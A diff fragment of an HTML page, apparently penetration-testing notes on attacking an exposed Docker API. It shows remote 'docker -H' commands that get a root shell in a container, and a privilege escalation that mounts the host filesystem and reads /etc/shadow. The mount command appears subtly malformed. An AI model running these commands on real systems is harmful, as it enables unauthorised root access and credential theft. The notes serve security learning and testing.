@@ -330,7 +330,6 @@
 
 {&quot;Platform&quot;: {&quot;Name&quot;: &quot;&quot;}, &quot;Components&quot;: [{&quot;Name&quot;: &quot;Engine&quot;, &quot;Version&quot;: &quot;18.06.1-ce&quot;, &quot;Details&quot;: {&quot;ApiVersion&quot;: &quot;1.38&quot;, &quot;Arch&quot;: &quot;amd64&quot;, &quot;BuildTime&quot;: &quot;2018-10-26T23:39:57.000000000+00:00&quot;, &quot;Experimental&quot;: &quot;false&quot;, &quot;GitCommit&quot;: &quot;e68fc7a/18.06.1-ce&quot;, &quot;GoVersion&quot;: &quot;go1.10.3&quot;, &quot;KernelVersion&quot;: &quot;4.14.47-64.38.amzn2.x86_64&quot;, &quot;MinAPIVersion&quot;: &quot;1.12&quot;, &quot;Os&quot;: &quot;linux&quot;}}], &quot;Version&quot;: &quot;18.06.1-ce&quot;, &quot;ApiVersion&quot;: &quot;1.38&quot;, &quot;MinAPIVersion&quot;: &quot;1.12&quot;, &quot;GitCommit&quot;: &quot;e68fc7a/18.06.1-ce&quot;, &quot;GoVersion&quot;: &quot;go1.10.3&quot;, &quot;Os&quot;: &quot;linux&quot;, &quot;Arch&quot;: &quot;amd64&quot;, &quot;KernelVersion&quot;: &quot;4.14.47-64.38.amzn2.x86_64&quot;, &quot;BuildTime&quot;: &quot;2018-10-26T23:39:57.000000000+00:00&quot;}
 </code></pre>
-
 <p>Then, using the CLI you can execute commands, for instance:</p>
 <pre><code class="language-bash">$ docker -H &lt;host&gt;:&lt;port&gt; ps
 
@@ -341,13 +340,11 @@ $ docker -H &lt;host&gt;:&lt;port&gt; exec -it &lt;container_name&gt; /bin/bash
 root@abc:/# whoami
 root
 </code></pre>
-
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>If the current user belong to the <code>docker</code> group then he can start a container
 with a binding to files own by root and read them:</p>
 <pre><code class="language-bash">docker run --it --rm -v /:/mnt alpine:latest /mnt sh
 </code></pre>
-
 <p>Inside the container shell he can read all the files as root:</p>
 <pre><code class="language-bash">cat /etc/shadow
 </code></pre>
